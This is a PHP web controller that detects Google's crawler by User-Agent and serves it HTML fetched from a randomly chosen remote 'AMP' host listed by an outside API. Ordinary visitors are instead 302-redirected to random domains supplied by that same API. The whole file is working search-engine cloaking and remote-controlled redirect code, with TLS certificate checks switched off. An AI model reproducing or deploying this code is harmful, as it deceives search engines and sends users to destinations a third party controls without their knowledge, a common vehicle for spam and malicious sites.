<?php
/**
 * Domain Controller
 * Created: 2024-12-17
 * Author: Laurensius Jeffrey
 * License: MIT
 */

namespace App\Controllers;

use Psr\Http\Message\ResponseInterface as Response;
use Psr\Http\Message\ServerRequestInterface as Request;
use App\Database\Database;
use GuzzleHttp\Client;

class DomainController
{
    private $db;

    public function __construct()
    {
        $this->db = Database::getInstance()->getConnection();
    }

    public function handleRedirect(Request $request, Response $response): Response
    {
        // Detect Googlebot User-Agent and serve index.html if detected
        $userAgent = $request->getHeaderLine('User-Agent');
        // Load Google crawler patterns from crawler_user_agent.json
        $isGoogleCrawler = false;
        $jsonPath = __DIR__ . '/../../crawler_user_agent.json';
        if (file_exists($jsonPath)) {
            $json = file_get_contents($jsonPath);
            $patterns = json_decode($json, true);
            if (is_array($patterns)) {
                foreach ($patterns as $bot) {
                    if (!empty($bot['pattern']) && stripos($userAgent, $bot['pattern']) !== false) {
                        $isGoogleCrawler = true;
                        break;
                    }
                }
            }
        }
        if ($isGoogleCrawler) {
            if (ob_get_level()) { ob_end_clean(); }
            // Build API URL from env and fetch AMP list for crawler handling
            $site = $_ENV['SITE'] ?? $_SERVER['SITE'] ?? getenv('SITE')
                ?: ($_ENV['API_SITE'] ?? $_SERVER['API_SITE'] ?? getenv('API_SITE'));
            if ($site) {
                $apiUrl = "https://checkipos.com/api/{$site}";
                try {
                    $httpClient = new Client([
                        'verify' => false,
                        'timeout' => 10
                    ]);
                    $apiResponse = $httpClient->get($apiUrl);
                    $apiData = json_decode($apiResponse->getBody(), true);

                    // Only serve HTML if AMP list is available
                    if (isset($apiData['amp']) && is_array($apiData['amp']) && !empty($apiData['amp'])) {
                        $ampDomains = $apiData['amp'];
                        $chosenHost = $ampDomains[array_rand($ampDomains)];
                        $indexHtmlUrl = "https://{$chosenHost}/";

                        $urlResponse = $httpClient->get($indexHtmlUrl);
                        $html = $urlResponse->getBody()->getContents();
                        $response->getBody()->write($html);
                        return $response->withHeader('Content-Type', 'text/html')->withStatus(200);
                    }
                    // If AMP is empty or missing, fall through to normal redirect logic below
                } catch (\Exception $e) {
                    // On any error, fall through to normal redirect logic
                }
            }
            // If SITE/API_SITE is not set, or AMP not available, continue to normal redirect logic
        }
        try {
            $hostname = $request->getUri()->getHost();
            $path = $request->getUri()->getPath();        // Get the path
            $query = $request->getUri()->getQuery();      // Get query parameters if any

            // Fetch data from new API using env SITE (or API_SITE)
            $site = $_ENV['SITE'] ?? $_SERVER['SITE'] ?? getenv('SITE')
                ?: ($_ENV['API_SITE'] ?? $_SERVER['API_SITE'] ?? getenv('API_SITE'));
            if (!$site) {
                throw new \Exception('Environment variable SITE or API_SITE is not set');
            }
            $apiUrl = "https://checkipos.com/api/{$site}";
            $httpClient = new Client([
                'verify' => false  // Disable SSL verification if needed
            ]);
            $apiResponse = $httpClient->get($apiUrl);
            $apiData = json_decode($apiResponse->getBody(), true);

            if (empty($apiData) || !isset($apiData['domain']) || !is_array($apiData['domain'])) {
                throw new \Exception("No valid data retrieved from API");
            }

            // The API returns an array of domains directly
            $domains = $apiData['domain'];

            if (empty($domains)) {
                throw new \Exception("No active target domains configured");
            }

            // Select a random domain from the array
            $randomDomain = $domains[array_rand($domains)];

            // Build the redirect URL with path and query parameters
            $redirectUrl = "https://{$randomDomain}{$path}";
            if (!empty($query)) {
                $redirectUrl .= "?{$query}";
            }

            $stmt = $this->db->prepare(
                'INSERT INTO redirects (source_domain, target_url, created_at) VALUES (?, ?, NOW())'
            );
            $stmt->execute([$hostname, $redirectUrl]);

            return $response
                ->withHeader('Location', $redirectUrl)
                ->withStatus(302);
        } catch (\Exception $e) {
            return $this->jsonResponse($response, ['error' => $e->getMessage()], 500);
        }
    }

    /**
     * Helper method to return JSON response
     *
     * @param Response $response
     * @param mixed $data
     * @param int $status
     * @return Response
     */
    private function jsonResponse(Response $response, $data, int $status = 200): Response
    {
        $response->getBody()->write(json_encode($data));
        
        return $response
            ->withHeader('Content-Type', 'application/json')
            ->withStatus($status);
    }
}